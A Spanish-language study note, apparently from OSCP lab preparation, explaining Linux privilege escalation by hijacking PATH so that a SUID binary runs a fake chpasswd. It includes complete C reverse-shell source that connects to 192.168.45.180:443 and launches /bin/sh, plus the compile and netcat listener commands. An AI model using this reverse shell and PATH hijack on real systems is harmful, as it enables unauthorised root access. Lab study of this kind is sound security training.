
## DESCRIPTION

Basicamente es que nos encontremos un fichero con el SUID que lo pueda ejecutar un usuario con el que tengamos acceso. Miramos a ver si llama a algun ejecutable o script que vamos a sustuir o bien a cambiar el path que lo apunta.

#### Mas información
* 


## EXPLOITATION

### OPTION 1: editando el PATH

Localizamos en el directorio de John un binario con el SUID, lo que significa que cualquiera que lo ejecute se ejecutará como root:

![[Pasted image 20230605194800.png]]

Miramos las cadenas de texto que tiene:

 strings RESET_PASSWD 
 ![[Pasted image 20230605194730.png]]
 
 Vemos que llama a chpasswd que es un binario que se encuentra en /usr/sbin:
 
 
 Y el PATH del usuario es el siguiente
 ![[Pasted image 20230605194727.png]]
 
 Vamos a cambiar el path a un directorio donde tengamos permisos y vamos a compilar un binario con el mismo nombre y que contenga una reverse shell. DE esta forma cuando ejecutemos RESET_PASSWD -> este ejecutara chpasswd que se encontrara en nuestro PATH es decir una recerse shell:
 
 export PATH=/usr/bin:/tmp
![[Pasted image 20230605194721.png]]


En tmp creamos un script en C con el siguiente código (https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#c)

primero comprobamos que tenga el compilador:
![[Pasted image 20230605194716.png]]
````


john@oscp:~$ cat /tmp/shell.c 
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void){
    int port = 443;
    struct sockaddr_in revsockaddr;

    int sockt = socket(AF_INET, SOCK_STREAM, 0);
    revsockaddr.sin_family = AF_INET;       
    revsockaddr.sin_port = htons(port);
    revsockaddr.sin_addr.s_addr = inet_addr("192.168.45.180");

    connect(sockt, (struct sockaddr *) &revsockaddr, 
    sizeof(revsockaddr));
    dup2(sockt, 0);
    dup2(sockt, 1);
    dup2(sockt, 2);

    char * const argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);

    return 0;       
}
```` 


Modificamos los campos subrayados:


![[Pasted image 20230605194710.png]]


Compilamos: gcc /tmp/shell.c --output chpasswd

Nos ponemos a la escucha en el puerto 443:
 nc -lvnp 443 

Y ahora ejecutamos RESET_PASSWD con el usuario john:

![[Pasted image 20230605194705.png]]




## MACHINES

* Hack The Box: 
* OSCP: OSCP A

**!!NOTA IMPORTANTE!!** 